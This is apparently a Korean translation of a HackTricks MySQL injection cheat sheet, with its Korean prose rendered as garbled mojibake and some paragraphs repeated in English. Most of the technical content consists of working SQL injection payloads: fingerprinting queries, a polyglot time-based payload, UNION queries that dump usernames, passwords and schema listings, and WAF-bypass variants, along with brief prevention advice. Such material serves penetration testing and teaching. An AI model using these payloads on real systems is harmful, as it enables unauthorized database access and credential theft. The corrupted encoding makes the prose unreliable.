# MySQL ì¸ì ì…˜

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

* **ì‚¬ì´ë²„ ë³´ì•ˆ íšŒì‚¬**ì—ì„œ ì¼í•˜ì‹œë‚˜ìš”? **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”**? ì•„ë‹ˆë©´ **PEASSì˜ ìµœì‹  ë²„ì „ì— ì•¡ì„¸ìŠ¤í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•´ë³´ì„¸ìš”!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•´ë³´ì„¸ìš”. ë…ì ì ì¸ [**NFT**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter**ì—ì„œ **íŒ”ë¡œìš°**í•˜ì„¸ìš” ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks)ì™€ [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**ì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹[**RootedCON**](https://www.rootedcon.com/)ì€ **ìŠ¤í˜ì¸**ì—ì„œ ê°€ì¥ ì¤‘ìš”í•œ ì‚¬ì´ë²„ ë³´ì•ˆ í–‰ì‚¬ ì¤‘ í•˜ë‚˜ë¡œ **ìœ ëŸ½**ì—ì„œ ê°€ì¥ ì¤‘ìš”í•œ í–‰ì‚¬ ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. **ê¸°ìˆ ì ì¸ ì§€ì‹ì„ ì´‰ì§„í•˜ëŠ” ë¯¸ì…˜**ì„ ê°€ì§€ê³  ì´ íšŒì˜ëŠ” ëª¨ë“  ë¶„ì•¼ì˜ ê¸°ìˆ ê³¼ ì‚¬ì´ë²„ ë³´ì•ˆ ì „ë¬¸ê°€ë“¤ì˜ ëœ¨ê±°ìš´ ë§Œë‚¨ì˜ ì¥ì…ë‹ˆë‹¤.

{% embed url="https://www.rootedcon.com/" %}

## Comments
```sql
-- MYSQL Comment
# MYSQL Comment
/* MYSQL Comment */
/*! MYSQL Special SQL */
/*!32302 10*/ Comment for MySQL version 3.23.02
```
## í¥ë¯¸ë¡œìš´ í•¨ìˆ˜ë“¤

### Mysql í™•ì¸í•˜ê¸°:
```
concat('a','b')
database()
version()
user()
system_user()
@@version
@@datadir
rand()
floor(2.9)
length(1)
count(1)
```
### ìœ ìš©í•œ í•¨ìˆ˜ë“¤

The following functions can be useful when performing MySQL injection attacks:

ë‹¤ìŒ í•¨ìˆ˜ë“¤ì€ MySQL ì¸ì ì…˜ ê³µê²©ì„ ìˆ˜í–‰í•  ë•Œ ìœ ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

- `version()`: Returns the version of the MySQL server.
- `database()`: Returns the name of the current database.
- `user()`: Returns the username used to connect to the MySQL server.
- `current_user()`: Returns the current MySQL user.
- `@@hostname`: Returns the hostname of the MySQL server.
- `@@datadir`: Returns the data directory of the MySQL server.
- `@@basedir`: Returns the base directory of the MySQL server.
- `@@version_compile_os`: Returns the operating system on which the MySQL server was compiled.
- `@@secure_file_priv`: Returns the directory where the server can write files.
- `@@global.have_ssl`: Returns whether the server supports SSL.
- `@@global.version_compile_machine`: Returns the machine type on which the MySQL server was compiled.
- `@@global.version`: Returns the version of the MySQL server.
- `@@global.version_comment`: Returns the comment associated with the MySQL server version.

These functions can provide valuable information about the MySQL server, which can be used to further exploit vulnerabilities or gain unauthorized access.

ì´ëŸ¬í•œ í•¨ìˆ˜ë“¤ì€ MySQL ì„œë²„ì— ëŒ€í•œ ìœ ìš©í•œ ì •ë³´ë¥¼ ì œê³µí•  ìˆ˜ ìˆìœ¼ë©°, ì´ë¥¼ í†µí•´ ì·¨ì•½ì ì„ ë”ìš± ì•…ìš©í•˜ê±°ë‚˜ ë¬´ë‹¨ ì ‘ê·¼ì„ ì‹œë„í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```sql
SELECT hex(database())
SELECT conv(hex(database()),16,10) # Hexadecimal -> Decimal
SELECT DECODE(ENCODE('cleartext', 'PWD'), 'PWD')# Encode() & decpde() returns only numbers
SELECT uncompress(compress(database())) #Compress & uncompress() returns only numbers
SELECT replace(database(),"r","R")
SELECT substr(database(),1,1)='r'
SELECT substring(database(),1,1)=0x72
SELECT ascii(substring(database(),1,1))=114
SELECT database()=char(114,101,120,116,101,115,116,101,114)
SELECT group_concat(<COLUMN>) FROM <TABLE>
SELECT group_concat(if(strcmp(table_schema,database()),table_name,null))
SELECT group_concat(CASE(table_schema)When(database())Then(table_name)END)
strcmp(),mid(),,ldap(),rdap(),left(),rigth(),instr(),sleep()
```
## ëª¨ë“  ì¸ì ì…˜

### MySQL ì¸ì ì…˜

MySQL ì¸ì ì…˜ì€ ì›¹ ì‘ìš© í”„ë¡œê·¸ë¨ì—ì„œ ë°œìƒí•˜ëŠ” ì¼ë°˜ì ì¸ ë³´ì•ˆ ì·¨ì•½ì  ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì€ ì•…ì˜ì ì¸ ì‚¬ìš©ìê°€ ì›¹ ì‘ìš© í”„ë¡œê·¸ë¨ì˜ ë°ì´í„°ë² ì´ìŠ¤ì— ì•¡ì„¸ìŠ¤í•˜ê³  ì¡°ì‘í•  ìˆ˜ ìˆëŠ” ê¸°íšŒë¥¼ ì œê³µí•©ë‹ˆë‹¤. MySQL ì¸ì ì…˜ì€ ì£¼ë¡œ ì‚¬ìš©ìë¡œë¶€í„° ì…ë ¥ ë°›ì€ ë°ì´í„°ë¥¼ ì ì ˆí•˜ê²Œ ê²€ì¦í•˜ì§€ ì•Šì„ ë•Œ ë°œìƒí•©ë‹ˆë‹¤.

### MySQL ì¸ì ì…˜ì˜ ì¢…ë¥˜

1. Union-based ì¸ì ì…˜
2. Boolean-based ì¸ì ì…˜
3. Error-based ì¸ì ì…˜
4. Time-based ì¸ì ì…˜
5. Blind ì¸ì ì…˜

### Union-based ì¸ì ì…˜

Union-based ì¸ì ì…˜ì€ UNION SQL ì—°ì‚°ìë¥¼ ì´ìš©í•˜ì—¬ ë°ì´í„°ë² ì´ìŠ¤ì˜ ì •ë³´ë¥¼ ì¶”ì¶œí•˜ëŠ” ê¸°ë²•ì…ë‹ˆë‹¤. ì´ ê¸°ë²•ì€ ë°ì´í„°ë² ì´ìŠ¤ì˜ í…Œì´ë¸”ì„ ì¡°ì‘í•˜ê±°ë‚˜ ë°ì´í„°ë¥¼ ì‚­ì œí•˜ëŠ” ë° ì‚¬ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Boolean-based ì¸ì ì…˜

Boolean-based ì¸ì ì…˜ì€ SQL ì¿¼ë¦¬ì˜ ê²°ê³¼ì— ë”°ë¼ ì°¸ê³¼ ê±°ì§“ì„ íŒë³„í•˜ì—¬ ë°ì´í„°ë² ì´ìŠ¤ì˜ ì •ë³´ë¥¼ ì¶”ì¶œí•˜ëŠ” ê¸°ë²•ì…ë‹ˆë‹¤. ì´ ê¸°ë²•ì€ ë¶ˆë¦¬ì–¸ ì—°ì‚°ìë¥¼ ì´ìš©í•˜ì—¬ ë°ì´í„°ë² ì´ìŠ¤ì˜ ì •ë³´ë¥¼ ì¡°ì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Error-based ì¸ì ì…˜

Error-based ì¸ì ì…˜ì€ SQL ì¿¼ë¦¬ì—ì„œ ë°œìƒí•˜ëŠ” ì˜¤ë¥˜ ë©”ì‹œì§€ë¥¼ ì´ìš©í•˜ì—¬ ë°ì´í„°ë² ì´ìŠ¤ì˜ ì •ë³´ë¥¼ ì¶”ì¶œí•˜ëŠ” ê¸°ë²•ì…ë‹ˆë‹¤. ì´ ê¸°ë²•ì€ ì˜¤ë¥˜ ë©”ì‹œì§€ë¥¼ í†µí•´ ë°ì´í„°ë² ì´ìŠ¤ì˜ êµ¬ì¡°ì™€ ë°ì´í„°ë¥¼ íŒŒì•…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Time-based ì¸ì ì…˜

Time-based ì¸ì ì…˜ì€ SQL ì¿¼ë¦¬ì˜ ì‹¤í–‰ ì‹œê°„ì„ ì´ìš©í•˜ì—¬ ë°ì´í„°ë² ì´ìŠ¤ì˜ ì •ë³´ë¥¼ ì¶”ì¶œí•˜ëŠ” ê¸°ë²•ì…ë‹ˆë‹¤. ì´ ê¸°ë²•ì€ ì‹œê°„ ì§€ì—° í•¨ìˆ˜ë¥¼ ì´ìš©í•˜ì—¬ ë°ì´í„°ë² ì´ìŠ¤ì˜ ì •ë³´ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Blind ì¸ì ì…˜

Blind ì¸ì ì…˜ì€ ë°ì´í„°ë² ì´ìŠ¤ì˜ ì •ë³´ë¥¼ ì¶”ì¶œí•˜ëŠ” ê³¼ì •ì—ì„œ ê²°ê³¼ë¥¼ ì›¹ ì‘ìš© í”„ë¡œê·¸ë¨ìœ¼ë¡œ ë°˜í™˜í•˜ì§€ ì•ŠëŠ” ê¸°ë²•ì…ë‹ˆë‹¤. ì´ ê¸°ë²•ì€ ë°ì´í„°ë² ì´ìŠ¤ì˜ ì •ë³´ë¥¼ ì¶”ì¸¡í•˜ê³  ì¶”ì¶œí•˜ê¸° ìœ„í•´ ë‹¤ì–‘í•œ ê¸°ë²•ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.

### ì¸ì ì…˜ ë°©ì§€ë¥¼ ìœ„í•œ ì¡°ì¹˜

MySQL ì¸ì ì…˜ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ ë‹¤ìŒê³¼ ê°™ì€ ì¡°ì¹˜ë¥¼ ì·¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

- ì…ë ¥ ë°ì´í„°ì˜ ìœ íš¨ì„± ê²€ì‚¬
- Prepared Statements ì‚¬ìš©
- ì›¹ ì‘ìš© í”„ë¡œê·¸ë¨ì˜ ê¶Œí•œ ì œí•œ
- ì—ëŸ¬ ë©”ì‹œì§€ ë…¸ì¶œ ì œí•œ
- ì›¹ ì‘ìš© í”„ë¡œê·¸ë¨ì˜ ì†ŒìŠ¤ ì½”ë“œ ê²€í† 

MySQL ì¸ì ì…˜ì€ ì›¹ ì‘ìš© í”„ë¡œê·¸ë¨ì˜ ë³´ì•ˆì„ ìœ„í˜‘í•˜ëŠ” ì¤‘ìš”í•œ ì·¨ì•½ì ì…ë‹ˆë‹¤. ë”°ë¼ì„œ ê°œë°œìì™€ ë³´ì•ˆ ì „ë¬¸ê°€ëŠ” ì´ëŸ¬í•œ ì¸ì ì…˜ ê¸°ë²•ì„ ì´í•´í•˜ê³  ë°©ì§€í•˜ê¸° ìœ„í•´ í•­ìƒ ì£¼ì˜í•´ì•¼ í•©ë‹ˆë‹¤.
```sql
SELECT * FROM some_table WHERE double_quotes = "IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/"
```
## í”Œë¡œìš°

"í˜„ëŒ€" ë²„ì „ì˜ **MySQL**ì—ì„œëŠ” "_**information\_schema.tables**_" ëŒ€ì‹  "_**mysql.innodb\_table\_stats**_"ë¥¼ ëŒ€ì²´í•  ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì„ ê¸°ì–µí•˜ì‹­ì‹œì˜¤ (ì´ëŠ” WAFë¥¼ ìš°íšŒí•˜ëŠ” ë° ìœ ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤).
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema=database();#Get name of the tables
SELECT column_name FROM information_schema.columns WHERE table_name="<TABLE_NAME>"; #Get name of the columns of the table
SELECT <COLUMN1>,<COLUMN2> FROM <TABLE_NAME>; #Get values
SELECT user FROM mysql.user WHERE file_priv='Y'; #Users with file privileges
```
### **í•˜ë‚˜ì˜ ê°’ë§Œ**

* `group_concat()`
* `Limit X,1`

### **í•˜ë‚˜ì”© ë¸”ë¼ì¸ë“œ**

* `substr(version(),X,1)='r'` ë˜ëŠ” `substring(version(),X,1)=0x70` ë˜ëŠ” `ascii(substr(version(),X,1))=112`
* `mid(version(),X,1)='5'`

### **ë¸”ë¼ì¸ë“œ ì¶”ê°€**

* `LPAD(version(),1...lenght(version()),'1')='asd'...`
* `RPAD(version(),1...lenght(version()),'1')='asd'...`
* `SELECT RIGHT(version(),1...lenght(version()))='asd'...`
* `SELECT LEFT(version(),1...lenght(version()))='asd'...`
* `SELECT INSTR('foobarbar', 'fo...')=1`

## ì—´ì˜ ìˆ˜ ê°ì§€

ê°„ë‹¨í•œ ORDER ì‚¬ìš©
```
order by 1
order by 2
order by 3
...
order by XXX

UniOn SeLect 1
UniOn SeLect 1,2
UniOn SeLect 1,2,3
...
```
## MySQL Union Based

MySQL Union BasedëŠ” SQL Injection ê³µê²©ì˜ ì¼ì¢…ìœ¼ë¡œ, UNION ì—°ì‚°ìë¥¼ ì´ìš©í•˜ì—¬ ë°ì´í„°ë² ì´ìŠ¤ì—ì„œ ì •ë³´ë¥¼ ì¶”ì¶œí•˜ëŠ” ê¸°ë²•ì…ë‹ˆë‹¤.

### ê³µê²© ì›ë¦¬

MySQL Union Based ê³µê²©ì€ ë‹¤ìŒê³¼ ê°™ì€ ë‹¨ê³„ë¡œ ì§„í–‰ë©ë‹ˆë‹¤:

1. ê³µê²©ìëŠ” ì·¨ì•½í•œ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì…ë ¥ í¼ì— SQL Injection í˜ì´ë¡œë“œë¥¼ ì‚½ì…í•©ë‹ˆë‹¤.
2. ì·¨ì•½í•œ ì¿¼ë¦¬ì— UNION ì—°ì‚°ìë¥¼ ì‚¬ìš©í•˜ì—¬ ê²°ê³¼ë¥¼ ì¡°ì‘í•©ë‹ˆë‹¤.
3. UNION ì—°ì‚°ìë¥¼ ì‚¬ìš©í•˜ì—¬ ì¿¼ë¦¬ ê²°ê³¼ë¥¼ ì¡°ì‘í•˜ë©´, ê³µê²©ìëŠ” ë°ì´í„°ë² ì´ìŠ¤ì—ì„œ ì •ë³´ë¥¼ ì¶”ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ê³µê²© ì˜ˆì‹œ

ë‹¤ìŒì€ MySQL Union Based ê³µê²©ì˜ ì˜ˆì‹œì…ë‹ˆë‹¤:

```sql
SELECT column1, column2 FROM table1 WHERE id = '1' UNION SELECT username, password FROM users WHERE '1'='1'
```

ìœ„ì˜ ì˜ˆì‹œì—ì„œ, UNION ì—°ì‚°ìë¥¼ ì‚¬ìš©í•˜ì—¬ `column1`ê³¼ `column2`ì˜ ê²°ê³¼ë¥¼ ì¡°ì‘í•˜ê³ , `users` í…Œì´ë¸”ì—ì„œ `username`ê³¼ `password`ë¥¼ ì¶”ì¶œí•©ë‹ˆë‹¤.

### ë°©ì–´ ëŒ€ì±…

MySQL Union Based ê³µê²©ì„ ë°©ì–´í•˜ê¸° ìœ„í•´ì„œëŠ” ë‹¤ìŒê³¼ ê°™ì€ ëŒ€ì±…ì„ ì ìš©í•´ì•¼ í•©ë‹ˆë‹¤:

- ì…ë ¥ ê²€ì¦: ì‚¬ìš©ì ì…ë ¥ì„ ê²€ì¦í•˜ì—¬ ì•…ì˜ì ì¸ SQL ì½”ë“œë¥¼ í•„í„°ë§í•©ë‹ˆë‹¤.
- Prepared Statements: Prepared Statementsë¥¼ ì‚¬ìš©í•˜ì—¬ ì¿¼ë¦¬ë¥¼ ì‹¤í–‰í•˜ë©´, ì…ë ¥ ê°’ì´ ìë™ìœ¼ë¡œ ì´ìŠ¤ì¼€ì´í”„ë˜ì–´ SQL Injection ê³µê²©ì„ ë°©ì§€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
- ì›¹ ë°©í™”ë²½: ì›¹ ë°©í™”ë²½ì„ ì‚¬ìš©í•˜ì—¬ ì•…ì˜ì ì¸ SQL Injection ì‹œë„ë¥¼ ì°¨ë‹¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

MySQL Union Based ê³µê²©ì€ ì·¨ì•½í•œ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ë°œìƒí•  ìˆ˜ ìˆëŠ” ì‹¬ê°í•œ ë³´ì•ˆ ì·¨ì•½ì ì…ë‹ˆë‹¤. ë”°ë¼ì„œ ê°œë°œìì™€ ë³´ì•ˆ ì „ë¬¸ê°€ëŠ” ì´ëŸ¬í•œ ê³µê²©ì„ ë°©ì§€í•˜ê¸° ìœ„í•´ ì ì ˆí•œ ëŒ€ì±…ì„ ì ìš©í•´ì•¼ í•©ë‹ˆë‹¤.
```sql
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...
```
## SSRF

**ì—¬ê¸°ì—ì„œëŠ” Mysql ì¸ì ì…˜ì„ ì•…ìš©í•˜ì—¬ SSRFë¥¼ ì–»ëŠ” ë‹¤ì–‘í•œ ì˜µì…˜ì„ ë°°ìš¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.** [**ì—¬ê¸°**](mysql-ssrf.md)**ì—ì„œ í™•ì¸í•˜ì„¸ìš”.**

## WAF ìš°íšŒ íŠ¸ë¦­

### Information\_schema ëŒ€ì•ˆ

"í˜„ëŒ€" ë²„ì „ì˜ **MySQL**ì—ì„œëŠ” _**information\_schema.tables**_ ëŒ€ì‹  _**mysql.innodb\_table\_stats**_ ë˜ëŠ” _**sys.x$schema\_flattened\_keys**_ ë˜ëŠ” **sys.schema\_table\_statistics**ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### ì½¤ë§ˆ ì—†ì´ MySQL ì¸ì ì…˜

ì½¤ë§ˆë¥¼ ì‚¬ìš©í•˜ì§€ ì•Šê³  2ê°œì˜ ì—´ì„ ì„ íƒí•©ë‹ˆë‹¤ ([https://security.stackexchange.com/questions/118332/how-make-sql-select-query-without-comma](https://security.stackexchange.com/questions/118332/how-make-sql-select-query-without-comma)):
```
-1' union select * from (select 1)UT1 JOIN (SELECT table_name FROM mysql.innodb_table_stats)UT2 on 1=1#
```
### ì—´ ì´ë¦„ ì—†ì´ ê°’ ê²€ìƒ‰í•˜ê¸°

ì–´ë–¤ ì‹œì ì—ì„œ í…Œì´ë¸”ì˜ ì´ë¦„ì€ ì•Œì§€ë§Œ í…Œì´ë¸” ë‚´ë¶€ì˜ ì—´ ì´ë¦„ì€ ëª¨ë¥´ëŠ” ê²½ìš°, ë‹¤ìŒê³¼ ê°™ì´ ì‹¤í–‰í•˜ì—¬ ëª‡ ê°œì˜ ì—´ì´ ìˆëŠ”ì§€ ì°¾ì•„ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
```bash
# When a True is returned, you have found the number of columns
select (select "", "") = (SELECT * from demo limit 1);     # 2columns
select (select "", "", "") < (SELECT * from demo limit 1); # 3columns
```
ê°€ì •í•´ë³´ì. 2ê°œì˜ ì—´ì´ ìˆë‹¤. (ì²« ë²ˆì§¸ ì—´ì€ IDì´ê³ , ë‹¤ë¥¸ í•˜ë‚˜ëŠ” flagì´ë‹¤.) flagì˜ ë‚´ìš©ì„ ë¬¸ì ë‹¨ìœ„ë¡œ ë¸Œë£¨íŠ¸í¬ìŠ¤í•˜ì—¬ ì‹œë„í•  ìˆ˜ ìˆë‹¤.
```bash
# When True, you found the correct char and can start ruteforcing the next position
select (select 1, 'flaf') = (SELECT * from demo limit 1);
```
ë” ë§ì€ ì •ë³´ëŠ” [https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952](https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### MySQL ì—­ì‚¬

MySQL ë‚´ë¶€ì—ì„œ ë‹¤ë¥¸ ì‹¤í–‰ ë‚´ì—­ì„ í™•ì¸í•˜ë ¤ë©´ í…Œì´ë¸” **sys.x$statement\_analysis**ë¥¼ ì½ìœ¼ë©´ ë©ë‹ˆë‹¤.

### ëŒ€ì²´ ë²„ì „
```
mysql> select @@innodb_version;
mysql> select @@version;
mysql> select version();
```
## ê¸°íƒ€ MYSQL ì¸ì ì…˜ ê°€ì´ë“œ

* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)]

## ì°¸ê³  ìë£Œ
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)


<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/)ì€ **ìŠ¤í˜ì¸**ì—ì„œ ê°€ì¥ ê´€ë ¨ì„± ë†’ì€ ì‚¬ì´ë²„ ë³´ì•ˆ í–‰ì‚¬ì´ë©° **ìœ ëŸ½**ì—ì„œ ê°€ì¥ ì¤‘ìš”í•œ í–‰ì‚¬ ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. **ê¸°ìˆ ì ì¸ ì§€ì‹ì„ ì´‰ì§„í•˜ëŠ” ë¯¸ì…˜**ì„ ê°€ì§€ê³  ì´ íšŒì˜ëŠ” ëª¨ë“  ë¶„ì•¼ì˜ ê¸°ìˆ  ë° ì‚¬ì´ë²„ ë³´ì•ˆ ì „ë¬¸ê°€ë“¤ì—ê²Œ ì—´ì •ì ì¸ ë§Œë‚¨ì˜ ì¥ì…ë‹ˆë‹¤.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

* **ì‚¬ì´ë²„ ë³´ì•ˆ íšŒì‚¬**ì—ì„œ ì¼í•˜ê³  ê³„ì‹ ê°€ìš”? **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”**? ë˜ëŠ” **PEASSì˜ ìµœì‹  ë²„ì „ì— ì•¡ì„¸ìŠ¤í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¶ìœ¼ì‹ ê°€ìš”? [**êµ¬ë… í”Œëœ**](https://github.com/sponsors/carlospolop)ì„ í™•ì¸í•´ë³´ì„¸ìš”!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•´ë³´ì„¸ìš”. ë…ì ì ì¸ [**NFT**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter**ì—ì„œ ì €ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš” ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **[hacktricks repo](https://github.com/carlospolop/hacktricks) ë° [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**ì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ìˆ ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
